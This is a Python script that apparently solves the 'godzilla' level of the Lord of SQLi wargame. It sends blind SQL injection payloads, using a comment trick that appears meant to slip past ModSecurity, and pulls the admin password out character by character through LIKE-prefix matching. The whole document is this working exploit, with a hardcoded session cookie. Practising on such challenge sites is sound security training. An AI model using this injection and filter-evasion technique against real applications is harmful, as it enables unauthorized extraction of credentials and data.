# lordofsqli: godzilla
# woanmeo11

import requests
from string import digits, ascii_lowercase

url = 'https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php'
cookies = {'PHPSESSID': '02t99arvkg9lkqgatt3fssuvsm'}

charset = digits + ascii_lowercase
passwd = ''

finish = False
while not finish:
    finish = True
    for c in charset:
        print(c, end='', flush=True)

        payload = {'id': f"'<@=1 or id='admin' and pw like '{passwd + c}%'#"}
        r = requests.get(url, payload, cookies=cookies)
        if 'Hello admin' in r.text:
            passwd += c
            finish = False
            print('\n->' + passwd)
            break

print('\n->' + passwd)
